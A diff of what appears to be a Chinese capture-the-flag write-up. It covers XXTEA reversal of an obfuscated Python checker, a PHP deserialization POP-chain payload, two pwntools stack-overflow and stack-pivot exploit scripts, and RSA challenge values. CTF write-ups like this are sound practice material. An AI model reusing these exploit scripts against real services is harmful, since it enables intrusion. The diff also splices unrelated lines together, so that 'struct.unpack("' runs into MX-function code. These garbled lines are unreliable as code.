@@ -165,34 +165,12 @@ def check (O0000000000O0O0O0 ):#line:63
         return jboolean (False )#line:67
     O00OO00000OO0OOOO =[]#line:69
     for O0O0OOOOO0OOO0OOO in range (0 ,36 ,4 ):#line:70
-        OO0OO0OOO000OO0O0 =O0000000000O0O0O0 [O0O0OOOOO0OOO0OOO :O0O0OOOOO0OOO0OOO +4 ].encode ('latin-1')#line:71
+        OO0OO0OOO000OO0O0 =O0000000000O0O0O0 [O0O0OOOOO0OOO0OOO :
+O0O0OOOOO0OOO0OOO +4 ].encode ('latin-1')#line:71
         O00OO00000OO0OOOO .append (OO0OO0OOO000OO0O0 )#line:72
     _O00OO0OOOOO00O00O =[]#line:73
     for O0O0OOOOO0OOO0OOO in O00OO00000OO0OOOO :#line:74
-        _O00OO0OOOOO00O00O .append (struct .unpack ("<I",O0O0OOOOO0OOO0OOO )[0 ])#line:75
-    print (_O00OO0OOOOO00O00O )#line:77
-    OO0OO0OOO000OO0O0 =encrypt (9 ,_O00OO0OOOOO00O00O ,[12345678 ,12398712 ,91283904 ,12378192 ])#line:78
-    OOOOO0OOO0OO00000 =[689085350 ,626885696 ,1894439255 ,1204672445 ,1869189675 ,475967424 ,1932042439 ,1280104741 ,2808893494 ]#line:85
-    for O0O0OOOOO0OOO0OOO in range (9 ):#line:86
-        if OOOOO0OOO0OO00000 [O0O0OOOOO0OOO0OOO ]!=OO0OO0OOO000OO0O0 [O0O0OOOOO0OOO0OOO ]:#line:87
-            return jboolean (False )#line:88
-    return jboolean (True )#line:90
-def sayHello ():#line:92
-    print ("hello from py")#line:93
-
-看到encrpyt函数特征 O0OOO0OO00O0000OO =0x9e3779b9，猜测 tea系列加密
-
-手动解混淆再分析 MX 函数，确定是 xxtea，解密脚本如下
-
-https://blog.csdn.net/A951860555/article/details/120120400
-
-编写 exp.py
-
-import struct  # line:3
-import ctypes  # line:4
-
-def MX(z, y, total, tea_key, p, e):  # line:7
-    temp1 = (z .value >> 5 ^ y .value << 2)+(y .value >> 3 ^ z .value << 4)  # line:8
+        _O00OO0OOOOO00O00O .append (struct .unpack ("> 5 ^ y .value << 2)+(y .value >> 3 ^ z .value << 4)  # line:8
     temp2 = (total .value ^ y .value)+(tea_key[(p & 3) ^ e .value] ^ z .value)  # line:9
     return ctypes.c_uint32(temp1 ^ temp2)  # line:11
 
@@ -459,17 +437,7 @@ if b'flag'in long_to_bytes(int(m)):
     else
         highlight_file(__FILE__);
 ?>
-```
-
-
-
-```
 附上exp
-```
-
-
-
-```
 <?php
 error_reporting(0);
 class Welcome{
@@ -512,11 +480,6 @@ $a = new Welcome();
 $a->arg = new H4ck3r();
 echo serialize($a);
 data传参生成的poc获取flag值
-```
-
-
-
-```
 from java import jboolean ,jclass #line:1
 import struct #line:3
 import ctypes #line:4
@@ -550,30 +513,12 @@ def check (O0000000000O0O0O0 ):#line:63
         return jboolean (False )#line:67
     O00OO00000OO0OOOO =[]#line:69
     for O0O0OOOOO0OOO0OOO in range (0 ,36 ,4 ):#line:70
-        OO0OO0OOO000OO0O0 =O0000000000O0O0O0 [O0O0OOOOO0OOO0OOO :O0O0OOOOO0OOO0OOO +4 ].encode ('latin-1')#line:71
+        OO0OO0OOO000OO0O0 =O0000000000O0O0O0 [O0O0OOOOO0OOO0OOO :
+O0O0OOOOO0OOO0OOO +4 ].encode ('latin-1')#line:71
         O00OO00000OO0OOOO .append (OO0OO0OOO000OO0O0 )#line:72
     _O00OO0OOOOO00O00O =[]#line:73
     for O0O0OOOOO0OOO0OOO in O00OO00000OO0OOOO :#line:74
-        _O00OO0OOOOO00O00O .append (struct .unpack ("<I",O0O0OOOOO0OOO0OOO )[0 ])#line:75
-    print (_O00OO0OOOOO00O00O )#line:77
-    OO0OO0OOO000OO0O0 =encrypt (9 ,_O00OO0OOOOO00O00O ,[12345678 ,12398712 ,91283904 ,12378192 ])#line:78
-    OOOOO0OOO0OO00000 =[689085350 ,626885696 ,1894439255 ,1204672445 ,1869189675 ,475967424 ,1932042439 ,1280104741 ,2808893494 ]#line:85
-    for O0O0OOOOO0OOO0OOO in range (9 ):#line:86
-        if OOOOO0OOO0OO00000 [O0O0OOOOO0OOO0OOO ]!=OO0OO0OOO000OO0O0 [O0O0OOOOO0OOO0OOO ]:#line:87
-            return jboolean (False )#line:88
-    return jboolean (True )#line:90
-def sayHello ():#line:92
-    print ("hello from py")#line:93
-```
-
-
-
-```
-import struct  # line:3
-import ctypes  # line:4
-
-def MX(z, y, total, tea_key, p, e):  # line:7
-    temp1 = (z .value >> 5 ^ y .value << 2)+(y .value >> 3 ^ z .value << 4)  # line:8
+        _O00OO0OOOOO00O00O .append (struct .unpack ("> 5 ^ y .value << 2)+(y .value >> 3 ^ z .value << 4)  # line:8
     temp2 = (total .value ^ y .value)+(tea_key[(p & 3) ^ e .value] ^ z .value)  # line:9
     return ctypes.c_uint32(temp1 ^ temp2)  # line:11
 
@@ -603,11 +548,6 @@ key_str = [689085350, 626885696, 1894439255, 1204672445, 1869189675, 4759
 res = encrypt_input = decrypt(9, key_str, [12345678, 12398712, 91283904, 12378192])
 for i in res:
     print(hex(i)[2:])
-```
-
-
-
-```
 # 38663163
 # 36656361
 # 3462342d
@@ -617,11 +557,6 @@ for i in res:
 # 31303161
 # 39386130
 # 32393563
-```
-
-
-
-```
 # 63 31 66 38
 # 61 63 65 36
 # 2d 34 62 34
@@ -631,11 +566,6 @@ for i in res:
 # 61 31 30 31
 # 30 61 38 39
 # 63 35 39 32
-```
-
-
-
-```
 from pwn import*
 context(arch='i386', os='linux',log_level="debug")
 context.terminal=["wt.exe","wsl.exe"]
@@ -678,11 +608,6 @@ p.sendafter("lets travel again!",payload)
 # payload =b"A"*0x30 +  p64(ssx - 8) + p64(leave_ret)
 # p.sendafter("TaiCooLa",payload)
 p.interactive()
-```
-
-
-
-```
 from pwn import*
 context(arch='amd64', os='linux',log_level="debug")
 context.terminal=["wt.exe","wsl.exe"]
@@ -727,11 +652,6 @@ p.sendlineafter("Give you a gift","Feng_ZZ")
 sleep(2)
 p.sendline(payload)
 p.interactive()
-```
-
-
-
-```
 hint = 251
 n = 108960799213330048807537253155955524262938083957673388027650083719597357215238547761557943499634403020900601643719960988288543702833581456488410418793239589934165142850195998163833962875355916819854378922306890883033496525502067124670576471251882548376530637034077
 e = 3359917755894163258174451768521610910491402727660720673898848239095553816126131162471035843306464197912997253011899806560624938869918893182751614520610693643690087988363775343761651198776860913310798127832036941524620284804884136983215497742441302140070096928109039
